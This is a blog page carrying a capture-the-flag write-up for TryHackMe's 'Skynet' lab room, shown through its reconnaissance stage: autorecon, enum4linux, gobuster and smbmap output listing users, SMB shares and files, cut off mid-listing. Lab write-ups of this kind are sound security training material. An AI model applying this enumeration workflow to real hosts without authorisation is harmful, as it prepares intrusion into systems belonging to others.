@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Skynet THM Room This is a quick writeup or another &amp;ldquo;just-me-taking-notes&amp;rdquo; thing for Skynet TryhackMe&amp;rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)
+Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all." />
+<meta name="keywords" content=", hacking, tryHackme, writeups" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://tzero86-bits.netlify.app/posts/skynet_writeup/" />
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-175520987-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+    <title>
+        
+            Skynet_writeup.sh :: tzero86.bits  — hacking notes, tools and rants.
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="Skynet_writeup.sh">
+<meta itemprop="description" content="Skynet THM Room This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for Skynet TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)
+Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.">
+<meta itemprop="datePublished" content="2020-08-25T20:59:31-04:00" />
+<meta itemprop="dateModified" content="2020-08-25T20:59:31-04:00" />
+<meta itemprop="wordCount" content="5233">
+<meta itemprop="image" content="https://tzero86-bits.netlify.app/"/>
+
+
+
+<meta itemprop="keywords" content="hacking,tryHackme,writeups," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://tzero86-bits.netlify.app/"/>
+
+<meta name="twitter:title" content="Skynet_writeup.sh"/>
+<meta name="twitter:description" content="Skynet THM Room This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for Skynet TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)
+Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all."/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-08-25 20:59:31 -0400 EDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">tzero86.bits</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://tzero86-bits.netlify.app/page/about/">About me</a></li><li><a href="https://tzero86-bits.netlify.app/posts/">Blog Posts</a></li><li><a href="https://tzero86-bits.netlify.app/">Home</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        25 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://tzero86-bits.netlify.app/posts/skynet_writeup/">Skynet_writeup.sh</a>
+      </h1>
+
+      
+        <img src="/img/skynet_cover.gif" class="post-cover" />
+      
+
+      <div class="post-content">
+        <h1 id="skynet-thm-room">Skynet THM Room</h1>
+<p>This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for Skynet TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)</p>
+<p>Enjoy!</p>
+<ul>
+<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/skynet">clicking this link</a>.</li>
+<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
+<li>Donwload Autorecon by clicking <a href="https://github.com/Tib3rius/AutoRecon">this</a> link.</li>
+</ul>
+<h2 id="task-1-deploy-and-compromise-the-vulnerable-machine">[Task 1] Deploy and compromise the vulnerable machine!</h2>
+<p>Let&rsquo;s start by doing some recon, some multithreaded reacon. We&rsquo;ll try out autorecon this time.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~$ autorecon 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanning target 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-quick on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-full-tcp on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-top-20-udp on 10.10.128.90
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Service detection nmap-top-20-udp on 10.10.128.90 returned non-zero exit code: <span style="color:#ae81ff">1</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:26:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">2</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:27:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">2</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service detection nmap-quick on 10.10.128.90 finished successfully in <span style="color:#ae81ff">2</span> minutes, <span style="color:#ae81ff">27</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ssh on tcp/22 on target 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found http on tcp/80 on target 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found pop3 on tcp/110 on target 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found netbios-ssn on tcp/139 on target 10.10.128.90
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/139/nbtscan<span style="color:#f92672">]</span> Scan cannot be run against tcp port 139. Skipping.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found imap on tcp/143 on target 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found netbios-ssn on tcp/445 on target 10.10.128.90
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/445/enum4linux on 10.10.128.90<span style="color:#f92672">]</span> Scan should only be run once and it appears to have already been queued. Skipping.
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/445/nbtscan<span style="color:#f92672">]</span> Scan cannot be run against tcp port 445. Skipping.
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/445/smbclient on 10.10.128.90<span style="color:#f92672">]</span> Scan should only be run once and it appears to have already been queued. Skipping.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/22/sslscan on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/22/nmap-ssh on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/sslscan on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/nmap-http on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/curl-index on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/curl-robots on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/wkhtmltoimage on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/whatweb on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/nikto on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/22/sslscan on 10.10.128.90 finished successfully in less than a second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/sslscan on 10.10.128.90 finished successfully in less than a second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/80/gobuster on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/110/sslscan on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/110/sslscan on 10.10.128.90 finished successfully in less than a second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/110/nmap-pop3 on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/curl-robots on 10.10.128.90 finished successfully in <span style="color:#ae81ff">1</span> second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/sslscan on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/curl-index on 10.10.128.90 finished successfully in <span style="color:#ae81ff">1</span> second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/nmap-smb on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/sslscan on 10.10.128.90 finished successfully in less than a second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/enum4linux on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/wkhtmltoimage on 10.10.128.90 finished successfully in <span style="color:#ae81ff">3</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/smbclient on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/110/nmap-pop3 on 10.10.128.90 finished successfully in <span style="color:#ae81ff">4</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/smbmap-share-permissions on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/smbclient on 10.10.128.90 finished successfully in <span style="color:#ae81ff">4</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/smbmap-list-contents on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/whatweb on 10.10.128.90 finished successfully in <span style="color:#ae81ff">8</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/smbmap-execute-command on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/22/nmap-ssh on 10.10.128.90 finished successfully in <span style="color:#ae81ff">11</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/143/sslscan on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/143/sslscan on 10.10.128.90 finished successfully in less than a second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/143/nmap-imap on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/143/nmap-imap on 10.10.128.90 finished successfully in <span style="color:#ae81ff">5</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/sslscan on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/sslscan on 10.10.128.90 finished successfully in less than a second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/nmap-smb on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/smbmap-execute-command on 10.10.128.90 finished successfully in <span style="color:#ae81ff">9</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/smbmap-share-permissions on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/smbmap-share-permissions on 10.10.128.90 finished successfully in <span style="color:#ae81ff">28</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/smbmap-list-contents on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:28:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">10</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/smbmap-share-permissions on 10.10.128.90 finished successfully in <span style="color:#ae81ff">26</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/smbmap-execute-command on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/smbmap-execute-command on 10.10.128.90 finished successfully in <span style="color:#ae81ff">7</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/smbmap-list-contents on 10.10.128.90 finished successfully in <span style="color:#ae81ff">49</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/smbmap-list-contents on 10.10.128.90 finished successfully in <span style="color:#ae81ff">1</span> minute, less than a second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:29:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">7</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/enum4linux on 10.10.128.90 finished successfully in <span style="color:#ae81ff">2</span> minutes, <span style="color:#ae81ff">22</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:30:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">6</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/nmap-http on 10.10.128.90 finished successfully in <span style="color:#ae81ff">2</span> minutes, <span style="color:#ae81ff">53</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:31:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">5</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:32:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">5</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/nmap-smb on 10.10.128.90 finished successfully in <span style="color:#ae81ff">5</span> minutes, less than a second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:33:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">4</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/nmap-smb on 10.10.128.90 finished successfully in <span style="color:#ae81ff">5</span> minutes, <span style="color:#ae81ff">51</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:34:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:35:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:36:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:37:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:38:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/nikto on 10.10.128.90 finished successfully in <span style="color:#ae81ff">11</span> minutes, <span style="color:#ae81ff">20</span> seconds
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:39:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">2</span> tasks still running on 10.10.128.90
+
+</code></pre></div><p>Ìf we review enum4linux results we see a username <strong>milesdyson</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#f92672">=============================</span> 
+|    Users on 10.10.128.90    |
+ <span style="color:#f92672">=============================</span> 
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 
+
+user:<span style="color:#f92672">[</span>milesdyson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x3e8<span style="color:#f92672">]</span>
+	User Name   :	milesdyson
+	Full Name   :	
+	Home Drive  :	<span style="color:#ae81ff">\\</span>skynet<span style="color:#ae81ff">\m</span>ilesdyson
+	Dir Drive   :	
+	Profile Path:	<span style="color:#ae81ff">\\</span>skynet<span style="color:#ae81ff">\m</span>ilesdyson<span style="color:#ae81ff">\p</span>rofile
+</code></pre></div><p>We also get some SMB shares:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#f92672">=========================================</span> 
+|    Share Enumeration on 10.10.128.90    |
+ <span style="color:#f92672">=========================================</span> 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	anonymous       Disk      Skynet Anonymous Share
+	milesdyson      Disk      Miles Dyson Personal Share
+	IPC$            IPC       IPC Service <span style="color:#f92672">(</span>skynet server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
+SMB1 disabled -- no workgroup available
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attempting to map shares on 10.10.128.90
+//10.10.128.90/print$	Mapping: DENIED, Listing: N/A
+//10.10.128.90/anonymous	Mapping: OK, Listing: OK
+//10.10.128.90/milesdyson	Mapping: DENIED, Listing: N/A
+//10.10.128.90/IPC$	<span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span style="color:#ae81ff">\*</span>
+
+</code></pre></div><p>Let&rsquo;s see to what gobuster found:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/.hta <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.hta.asp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.hta.aspx <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.hta.jsp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.hta.txt <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.hta.html <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.hta.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htaccess.asp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htaccess.aspx <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htaccess.jsp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htaccess.txt <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htaccess.html <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htaccess.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htpasswd.txt <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htpasswd.html <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htpasswd.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htpasswd.asp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htpasswd.aspx <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/.htpasswd.jsp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+/config <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span>
+</code></pre></div><p>We also got some SMBMap results back with some files on the shares:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Working on it...
+                                
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	anonymous                                         	READ ONLY	Skynet Anonymous Share
+	.<span style="color:#ae81ff">\a</span>nonymous<span style="color:#ae81ff">\*</span>
+	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 2019	.
+	dr--r--r--                <span style="color:#ae81ff">0</span> Tue Sep <span style="color:#ae81ff">17</span> 03:20:17 2019	..
+	fr--r--r--              <span style="color:#ae81ff">163</span> Tue Sep <span style="color:#ae81ff">17</span> 23:04:59 2019	attention.txt
+	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 2019	logs
+	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	books
+	.<span style="color:#ae81ff">\a</span>nonymous<span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\*</span>
+	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 2019	.
+	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 2019	..
+	fr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:42:13 2019	log2.txt
+	fr--r--r--              <span style="color:#ae81ff">471</span> Wed Sep <span style="color:#ae81ff">18</span> 00:41:59 2019	log1.txt
+	fr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 2019	log3.txt
+	.<span style="color:#ae81ff">\a</span>nonymous<span style="color:#ae81ff">\b</span>ooks<span style="color:#ae81ff">\*</span>
+	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	.
+	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 2019	..
+	fr--r--r--         <span style="color:#ae81ff">33153722</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Introduction to Machine Learning with Python.pdf
+	fr--r--r--          <span style="color:#ae81ff">4222827</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	What You Need to Know about Machine Learning.pdf
+	fr--r--r--          <span style="color:#ae81ff">4986980</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	Thoughtful Machine Learning with Python.mobi
+	fr--r--r--         <span style="color:#ae81ff">16433984</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning.pdf
+	fr--r--r--         <span style="color:#ae81ff">11527855</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Reinforcement Learning - With Open AI, TensorFlow and Keras Using Python.pdf
+	fr--r--r--          <span style="color:#ae81ff">2219430</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning Using C# Succinctly.pdf
+	fr--r--r--         <span style="color:#ae81ff">14637798</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Real World Machine Learning.epub
+	fr--r--r--          <span style="color:#ae81ff">1961798</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Neural Networks Using C# Succinctly.pdf
+	fr--r--r--          <span style="color:#ae81ff">4900975</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Quantum Machine Learning - Peter Wittek.epub
+	fr--r--r--           <span style="color:#ae81ff">230243</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Introduction To Python Programming - Beginner<span style="color:#960050;background-color:#1e0010">&#39;</span>s Guide To Computer Programming And Machine Learning.epub
+	fr--r--r--          <span style="color:#ae81ff">4561261</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Large Scale Machine Learning with Python.pdf
+	fr--r--r--         <span style="color:#ae81ff">10067139</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Mastering Machine Learning with Python in Six Steps.pdf
+	fr--r--r--          <span style="color:#ae81ff">3816111</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Big Data, Data Mining, and Machine Learning.epub
+	fr--r--r--          <span style="color:#ae81ff">8336682</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning Case Studies.pdf
+	fr--r--r--         <span style="color:#ae81ff">12445322</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Practical Machine Learning.pdf
+	fr--r--r--         <span style="color:#ae81ff">39999962</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning Blueprints.pdf
